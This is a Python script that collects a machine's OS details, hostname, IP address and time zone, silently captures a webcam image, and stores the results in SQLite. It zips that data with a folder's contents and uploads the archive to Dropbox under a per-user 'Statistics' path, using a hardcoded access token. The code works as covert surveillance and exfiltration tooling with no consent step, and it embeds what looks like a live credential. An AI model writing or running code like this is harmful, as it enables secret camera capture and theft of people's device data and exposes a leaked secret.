import os
import socket
import platform
import sqlite3
import zipfile
import json
import datetime
from geopy.geocoders import Nominatim
import cv2  # Ensure OpenCV is installed: pip install opencv-python
import time
import matplotlib.pyplot as plt
import dropbox

# Function to get system details
def get_system_info():
    system_info = {
        "os": platform.system(),
        "os_version": platform.version(),
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "time_zone": time.tzname[0],
        "timestamp": str(datetime.datetime.now())
    }
    return system_info

# Function to get user address using Geopy (example using Nominatim)
def get_location_info():
    geolocator = Nominatim(user_agent="geoapiExercises")
    location = geolocator.geocode("1600 Amphitheatre Parkway, Mountain View, CA")  # Placeholder
    return {
        "latitude": location.latitude if location else None,
        "longitude": location.longitude if location else None,
        "map_url": f"https://www.google.com/maps?q={location.latitude},{location.longitude}" if location else None
    }

# Function to capture image from front camera
def capture_front_camera():
    cap = cv2.VideoCapture(0)
    time.sleep(2)  # Give the camera some time to warm up
    ret, frame = cap.read()
    image_path = "./App/data/forbidden/camera_capture.jpg"
    if ret:
        cv2.imwrite(image_path, frame)
    cap.release()
    return image_path

# Function to store information in a SQLite database
def store_data(db_path, data):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_data (
            id INTEGER PRIMARY KEY,
            os TEXT,
            hostname TEXT,
            ip_address TEXT,
            time_zone TEXT,
            timestamp TEXT,
            latitude REAL,
            longitude REAL,
            map_url TEXT,
            camera_image TEXT
        )
    """)
    cursor.execute("""
        INSERT INTO user_data (os, hostname, ip_address, time_zone, timestamp, latitude, longitude, map_url, camera_image)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        data["os"],
        data["hostname"],
        data["ip_address"],
        data["time_zone"],
        data["timestamp"],
        data["latitude"],
        data["longitude"],
        data["map_url"],
        data["camera_image"]
    ))
    conn.commit()
    conn.close()

# Function to generate a graph based on OS data
def generate_graph(db_path):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT os, COUNT(*) FROM user_data GROUP BY os")
    os_data = cursor.fetchall()

    # Prepare data for plotting
    os_names = [row[0] for row in os_data]
    counts = [row[1] for row in os_data]

    # Create a pie chart
    plt.figure(figsize=(6, 6))
    plt.pie(counts, labels=os_names, autopct='%1.1f%%', startangle=90)
    plt.title("Operating System Distribution")
    graph_path = "./App/data/forbidden/os_distribution.png"
    plt.savefig(graph_path)
    plt.close()
    
    conn.close()
    return graph_path

# Function to zip the database and graph
def zip_data(db_path, folder_name, graph_path):
    zip_path = './App/data/forbidden/blackbuilder.zip'
    with zipfile.ZipFile(zip_path, 'w') as zip_file:
        zip_file.write(db_path, os.path.basename(db_path))
        zip_file.write(graph_path, os.path.basename(graph_path))
        for foldername, subfolders, filenames in os.walk(folder_name):
            for filename in filenames:
                zip_file.write(os.path.join(foldername, filename), os.path.relpath(os.path.join(foldername, filename), folder_name))
    return zip_path

# Function to upload to Dropbox
def upload_to_dropbox(zip_file_path, folder_name, dropbox_token):
    dbx = dropbox.Dropbox(dropbox_token)
    with open(zip_file_path, "rb") as f:
        dropbox_path = f"/Statistics/{folder_name}/{os.path.basename(zip_file_path)}"
        dbx.files_upload(f.read(), dropbox_path)
    print(f"Uploaded to Dropbox at {dropbox_path}")

if __name__ == "__main__":
    system_info = get_system_info()
    location_info = get_location_info()
    camera_image = capture_front_camera()

    data = {
        **system_info,
        **location_info,
        "camera_image": camera_image
    }

    db_path = './App/data/forbidden/blackbuilder.db'
    store_data(db_path, data)

    # Generate graph
    graph_path = generate_graph(db_path)

    # Zip data
    zip_file_path = zip_data(db_path, 'wovavz', graph_path)

    # Dropbox upload
    dropbox_token = "sl.B-7_6sPL6Q5BKM4kEFErDvAo0sINWN-HYN6M66FOaXXWBaYWWF21Qt_KtQYGkdUVkC7a41ykbPAdYNm4FYyzCtnRQTQbB8SIttOL5aSFzFsRlFXTia3wHZNtmwH5lxrYzdLpPczBr3mL"
    folder_name = f"User1"  # Customize folder naming logic if needed
    upload_to_dropbox(zip_file_path, folder_name, dropbox_token)

    print("Data collected, graph generated, and uploaded to Dropbox successfully.")
